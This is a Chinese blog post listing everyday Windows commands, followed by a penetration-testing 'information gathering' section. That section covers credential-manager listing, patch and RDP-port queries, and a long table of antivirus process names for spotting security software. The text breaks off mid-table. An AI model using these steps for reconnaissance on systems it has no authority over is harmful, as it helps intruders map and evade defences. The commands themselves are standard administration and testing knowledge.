<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="windows常用命令, Linux，cybersecurity等">
    <meta name="description" content="keep hungry,keep foolish">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>windows常用命令 | Leaves的博客</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Leaves的博客</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Leaves的博客</div>
        <div class="logo-desc">
            
            keep hungry,keep foolish
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/GreenLeavesl" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/GreenLeavesl" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">windows常用命令</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/windows/">
                                <span class="chip bg-color">windows</span>
                            </a>
                        
                            <a href="/tags/%E5%91%BD%E4%BB%A4/">
                                <span class="chip bg-color">命令</span>
                            </a>
                        
                            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                                <span class="chip bg-color">信息收集</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/windows%E5%91%BD%E4%BB%A4/" class="post-category">
                                windows命令
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-12-23
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="windows基础命令"><a href="#windows基础命令" class="headerlink" title="windows基础命令"></a>windows基础命令</h1><h2 id="windowsc常用基础命令"><a href="#windowsc常用基础命令" class="headerlink" title="windowsc常用基础命令"></a>windowsc常用基础命令</h2><ol>
<li>注册表:<code>regedit</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/fef8d03ed661499b9f210a26d432ff82.png"></p>
<ol start="2">
<li>日志查看器:<code>eventvwr</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/754d4ad683a54e3b8906197109a0f45a.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/355edd9f51fc4da29790923784e9e57f.png"></p>
<ol start="3">
<li>组策略编辑器：<code>gpedit.msc</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/f7d30e5902294720b54e645594d934ce.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/dee64602508944a28e33ba7de6ce8448.png"></p>
<ol start="4">
<li>服务查看器：<code>services.msc</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/b806448f549e4a5983e61bdea4825062.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/db8c784f21404c83ae013ee6ec769717.png"></p>
<ol start="5">
<li>远程桌面：<code>mstsc</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/70f660a9a0754297bb4b79121c23df74.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/258104c696d6422590f5b45a0b45dd59.png"></p>
<ol start="6">
<li>查看SID：<code>whoami /user</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/354b1ca4456e4242b8288a5c97883086.png"></p>
<ol start="7">
<li>查看当前设备上的所有用户：<code>net user</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/4df0909ea7d14a109c13f80bf0ac6ac8.png"></p>
<ol start="8">
<li>查看设备上的指定用户：<code>net user 用户名</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/19e26f0e53824d0084a9bd98d41ebdcf.png"></p>
<ol start="9">
<li>查看在线用户：<code>query user</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/acf5c54093e343cd991b65779d9d4fd4.png"></p>
<ol start="10">
<li>注销在线用户：<code>logoff ID号</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/7f85d1559f174fc0bfa05f39f515bac1.png"></p>
<ol start="11">
<li>查看权限：<code>whoami</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/2ca06d076e7f48ad9a6400940153ecfb.png"><br>ps:格式为主机名+用户名</p>
<ol start="12">
<li>查询主机名：<code>hostname</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/2c12bd99577d436eb1f01140a77d1a12.png"></p>
<ol start="13">
<li>查询详细权限：<code>whoami /priv</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/b5a08e6aaf86457ba069b49b4b1a498e.png"></p>
<ol start="14">
<li>添加用户：<code>net user 用户名 密码 /add</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ce418683de9b4fcca30bb4eac95cb675.png"></p>
<ol start="15">
<li>删除用户：<code>net user 用户名 /del</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/231947d31b7d4c32af059c56e796c580.png"></p>
<ol start="16">
<li>查询组：<code>net localgroup</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/e6620ddecc834645893005e6a8d63076.png"></p>
<ol start="17">
<li>查询组内成员：<code>net localgroup 组名</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/6abc8ad81ee244188120ce52590eea84.png"></p>
<ol start="18">
<li>将指定用户添加到指定组内：<code>net localgroup 组名 用户名 /add</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ba8656ecf4b24ea080b3e1b1d6be4d03.png"></p>
<ol start="19">
<li>查询系统信息：<code>systeminfo</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/7151010d7eef4a34ae40f5509a71617e.png"></p>
<ol start="20">
<li>查询系统架构：<code>echo %PROCESSOR_ARCHITECTURE%</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/71775d48d280443fb6f2f0919a5db44b.png"></p>
<ol start="21">
<li>使用powershell查询系统安装软件与版本信息：<code>Get-WmiObject -Class win32_product | Select-Object -Property name,version</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/05e1896092034e10ac2b8b2016bdcda3.png"></p>
<ol start="22">
<li>使用wmic查询系统安装软件与版本信息（在win10以下版本使用）：<code>wmic product get name,version</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/41618587f4ac4df5ab451d76b1497c25.png"></p>
<ol start="23">
<li><p>使用wmic查询系统服务与服务进程ID、服务状态：<code>wmic service list brief</code><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/b2aa42c1229b4d3faa408b2b93e9202b.png"></p>
</li>
<li><p>查询进程：<code>tasklist</code></p>
</li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ea7a4e8869c84fcca83f181b21e5021c.png"></p>
<ol start="25">
<li>使用wmic查询进程：<code>wmic process list brief</code></li>
</ol>
<ol start="26">
<li>筛选命令和linux的grep相近：&lt;code&gt;findstr&lt;/code&gt;”&gt;26.筛选命令和linux的grep相近：<code>findstr</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/7719854174f14107a05e0a1c8773488e.png"></p>
<ol start="27">
<li>结束进程命令：<code>taskkill /f /pid PID号</code> <code>taskkill /f /im 进程名</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/762cbfeecffa43d98dcdbe10f12009f8.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/93b08eb97b3a4a289d55e029196badd7.png"></p>
<ol start="28">
<li>显示每个进程中的服务信息：<code>tasklist /svc</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/fcd8d24d185941fba5882f64cad5824e.png"></p>
<ol start="29">
<li>使用wmic查看windows系统中补丁详细信息：<code>wmic qfe get caption,description,hotfixid,installedon</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/9497f2538add41f980784312f831a140.png"></p>
<ol start="30">
<li>使用wmic显示windows系统中补丁号：<code>wmic qfe get hotfixid</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/019d07df87ec4e9b9c9b223cb1563290.png"></p>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/b21e0c7cd84d46dfb19933de7d7d18da.png"></p>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ae1a9090c76543f8a3f229d373e318ab.png"></p>
<ol start="33">
<li>查询arp表：<code>arp -a</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/c7fa0de2307b48a79c29b01f309b9584.png"></p>
<ol start="34">
<li>查看防火墙配置信息：<code>netsh firewall show config</code></li>
</ol>
<ol start="35">
<li>查询端口信息：<code>netstat -ano</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/35b5d2d965714abd965fc26185ef02f2.png"></p>
<ol start="36">
<li>查询代理信息：<code>reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"</code></li>
</ol>
<ol start="37">
<li><p>查询远程连接端口：<code>reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber</code></p>
</li>
<li><p>清除DNS缓存：<code>ipconfig /flushdns</code></p>
</li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/07557a61bc2d4b12b97c696c8e55f49e.png"></p>
<ol start="39">
<li>查询DNS缓存：<code>ipconfig /displaydns</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/091736b3d3134506be02c3209d1dedc0.png"></p>
<ol start="40">
<li>查询MAC地址：<code>getmac</code> <code>ipconfig /all</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/9510fc5066424b20ac8f24ba9a995bd3.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/d5d4704ef65d4ccf84b353e788c07b01.png"></p>
<ol start="41">
<li>查看文本内容：<code>type *.txt</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/518032d010554155950d1b3f39680c66.png"></p>
<ol start="42">
<li>查看凭据管理器：<code>cmdkey /list</code></li>
</ol>
<p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/6ae020507260413c838fc70d639a102c.png"></p>
<ol start="43">
<li>环境变量遍历：<code>set</code><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/4818e7274d084df7be3712d6d40ac7de.png"></li>
</ol>
<h2 id="windows-信息收集"><a href="#windows-信息收集" class="headerlink" title="windows 信息收集"></a>windows 信息收集</h2><h3 id="本机信息"><a href="#本机信息" class="headerlink" title="本机信息"></a>本机信息</h3><h4 id="1、系统程序"><a href="#1、系统程序" class="headerlink" title="1、系统程序"></a>1、系统程序</h4><p>收集系统信息，包括操作系统版本，已安装</p>
<figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">补丁列表等。通常使⽤已下⽅法收集：</span><br><span class="line">net config workstation/server          <span class="comment"># 查 询简易系统信息</span></span><br><span class="line">systeminfo           <span class="comment"># 查询系统详细信息，注意版本、位数、域、补丁信息、更新频率</span></span><br><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,InstalledOn        <span class="comment"># 使用wmic查看安装在系统中的补丁:名称，描述，ID，安装时间</span></span><br></pre></td></tr></tbody></table></figure>
<p>注：其中 systeminfo 命令查询内容最全，但如果系统更新的补丁较多，可能会导致反应反应时间过⻓； 使⽤ webshell 执⾏此命令可能会因为超时导致⽆法正常回显，或回显内容⻓度过⻓，⽆法全部显示。在渗透测试systeminfo使用频率较高。</p>
<h4 id="2、进程服务"><a href="#2、进程服务" class="headerlink" title="2、进程服务"></a>2、进程服务</h4><figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">tasklist /v          <span class="comment"># 查询正在运⾏的进程</span></span><br><span class="line">wmic product <span class="keyword">get</span> <span class="built_in">name</span>,<span class="built_in">version</span>            <span class="comment"># 查询所有安装过的软件及版本</span></span><br><span class="line">powershell <span class="string">"Get-WmiObject -class Win32_Product |Select-Object -Pro perty name,version"</span> </span><br><span class="line"><span class="comment"># 使⽤ powershell 查询所有安装过的软件及版本，效果和 wmic 相同 </span></span><br><span class="line">wmic service <span class="built_in">list</span> brief         <span class="comment"># 查询当前机器的服务信息</span></span><br></pre></td></tr></tbody></table></figure>
<p><strong>常⻅杀软进程名：</strong></p>
<figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">{<span class="string">"360tray.exe"</span>,    <span class="string">"360安全卫士"</span>},</span><br><span class="line">{<span class="string">"360sd.exe"</span>,      <span class="string">"360杀毒"</span>},</span><br><span class="line">{<span class="string">"a2guard.exe"</span>,    <span class="string">"a-squared杀毒"</span>},</span><br><span class="line">{<span class="string">"ad-watch.exe"</span>,    <span class="string">"Lavasoft杀毒"</span>},</span><br><span class="line">{<span class="string">"cleaner8.exe"</span>,    <span class="string">"The Cleaner杀毒"</span>},</span><br><span class="line">{<span class="string">"vba32lder.exe"</span>,    <span class="string">"vb32杀毒"</span>},</span><br><span class="line">{<span class="string">"MongoosaGUI.exe"</span>,    <span class="string">"Mongoosa杀毒"</span>},</span><br><span class="line">{<span class="string">"CorantiControlCenter32.exe"</span>,    <span class="string">"Coranti2012杀毒"</span>},</span><br><span class="line">{<span class="string">"F-PROT.EXE"</span>,    <span class="string">"F-PROT杀毒"</span>},</span><br><span class="line">{<span class="string">"CMCTrayIcon.exe"</span>,    <span class="string">"CMC杀毒"</span>},</span><br><span class="line">{<span class="string">"K7TSecurity.exe"</span>,    <span class="string">"K7杀毒"</span>},</span><br><span class="line">{<span class="string">"UnThreat.exe"</span>,    <span class="string">"UnThreat杀毒"</span>},</span><br><span class="line">{<span class="string">"CKSoftShiedAntivirus4.exe"</span>,    <span class="string">"Shield Antivirus杀毒"</span>},</span><br><span class="line">{<span class="string">"AVWatchService.exe"</span>,    <span class="string">"VIRUSfighter杀毒"</span>},</span><br><span class="line">{<span class="string">"ArcaTasksService.exe"</span>,    <span class="string">"ArcaVir杀毒"</span>},</span><br><span class="line">{<span class="string">"iptray.exe"</span>,    <span class="string">"Immunet杀毒"</span>},</span><br><span class="line">{<span class="string">"PSafeSysTray.exe"</span>,    <span class="string">"PSafe杀毒"</span>},</span><br><span class="line">{<span class="string">"nspupsvc.exe"</span>,    <span class="string">"nProtect杀毒"</span>},</span><br><span class="line">{<span class="string">"SpywareTerminatorShield.exe"</span>,    <span class="string">"SpywareTerminator杀毒"</span>},</span><br><span class="line">{<span class="string">"BKavService.exe"</span>,    <span class="string">"Bkav杀毒"</span>},</span><br><span class="line">{<span class="string">"MsMpEng.exe"</span>,    <span class="string">"Microsoft Security Essentials"</span>},</span><br><span class="line">{<span class="string">"SBAMSvc.exe"</span>,    <span class="string">"VIPRE"</span>},</span><br><span class="line">{<span class="string">"ccSvcHst.exe"</span>,    <span class="string">"Norton杀毒"</span>},</span><br><span class="line">{<span class="string">"QQ.exe"</span>,    <span class="string">"QQ"</span>},</span><br><span class="line">{<span class="string">"f-secure.exe"</span>,    <span class="string">"冰岛"</span>},</span><br><span class="line">{<span class="string">"avp.exe"</span>,        <span class="string">"卡巴斯基"</span>},</span><br><span class="line">{<span class="string">"KvMonXP.exe"</span>,    <span class="string">"江民杀毒"</span>},</span><br><span class="line">{<span class="string">"RavMonD.exe"</span>,    <span class="string">"瑞星杀毒"</span>},</span><br><span class="line">{<span class="string">"Mcshield.exe"</span>,   <span class="string">"麦咖啡"</span>},</span><br><span class="line">{<span class="string">"egui.exe"</span>,       <span class="string">"NOD32"</span>},</span><br><span class="line">{<span class="string">"kxetray.exe"</span>,    <span class="string">"金山毒霸"</span>}, </span><br><span class="line">{<span class="string">"knsdtray.exe"</span>,   <span class="string">"可牛杀毒"</span>},</span><br><span class="line">{<span class="string">"TMBMSRV.exe"</span>,    <span class="string">"趋势杀毒"</span>},</span><br><span class="line">{<span class="string">"avcenter.exe"</span>,   <span class="string">"Avira(小红伞)"</span>},</span><br><span class="line">{<span class="string">"ashDisp.exe"</span>,    <span class="string">"Avast网络安全"</span>}, </span><br><span class="line">{<span class="string">"rtvscan.exe"</span>,    <span class="string">"诺顿杀毒"</span>}, </span><br><span class="line">{<span class="string">"ksafe.exe"</span>,      <span class="string">"金山卫士"</span>}, </span><br><span class="line">{<span class="string">"QQPCRTP.exe"</span>,    <span class="string">"QQ电脑管家"</span>},</span><br><span class="line">{<span class="string">"Miner.exe"</span>,    <span class="string">"流量矿石"</span>},</span><br><span class="line">{<span class="string">"AYAgent.aye"</span>,    <span class="string">"韩国胶囊"</span>},</span><br><span class="line">{<span class="string">"patray.exe"</span>,    <span class="string">"安博士"</span>},</span><br><span class="line">{<span class="string">"V3Svc.exe"</span>,    <span class="string">"安博士V3"</span>},</span><br><span class="line">{<span class="string">"avgwdsvc.exe"</span>,    <span class="string">"AVG杀毒"</span>},</span><br><span class="line">{<span class="string">"ccSetMgr.exe"</span>,    <span class="string">"赛门铁克"</span>},</span><br><span class="line">{<span class="string">"QUHLPSVC.EXE"</span>,    <span class="string">"QUICK HEAL杀毒"</span>},</span><br><span class="line">{<span class="string">"mssecess.exe"</span>,    <span class="string">"微软杀毒"</span>},</span><br><span class="line">{<span class="string">"SavProgress.exe"</span>,    <span class="string">"Sophos杀毒"</span>},</span><br><span class="line">{<span class="string">"fsavgui.exe"</span>,    <span class="string">"F-Secure杀毒"</span>},</span><br><span class="line">{<span class="string">"vsserv.exe"</span>,    <span class="string">"比特梵德"</span>},</span><br><span class="line">{<span class="string">"remupd.exe"</span>,    <span class="string">"熊猫卫士"</span>},</span><br><span class="line">{<span class="string">"FortiTray.exe"</span>,    <span class="string">"飞塔"</span>},</span><br><span class="line">{<span class="string">"safedog.exe"</span>,    <span class="string">"安全狗"</span>},</span><br><span class="line">{<span class="string">"parmor.exe"</span>,    <span class="string">"木马克星"</span>},</span><br><span class="line">{<span class="string">"beikesan.exe"</span>,    <span class="string">"贝壳云安全"</span>},</span><br><span class="line">{<span class="string">"KSWebShield.exe"</span>,    <span class="string">"金山网盾"</span>},</span><br><span class="line">{<span class="string">"TrojanHunter.exe"</span>,    <span class="string">"木马猎手"</span>},</span><br><span class="line">{<span class="string">"GG.exe"</span>,    <span class="string">"巨盾网游安全盾"</span>},</span><br><span class="line">{<span class="string">"adam.exe"</span>,    <span class="string">"绿鹰安全精灵"</span>},</span><br><span class="line">{<span class="string">"AST.exe"</span>,    <span class="string">"超级巡警"</span>},</span><br><span class="line">{<span 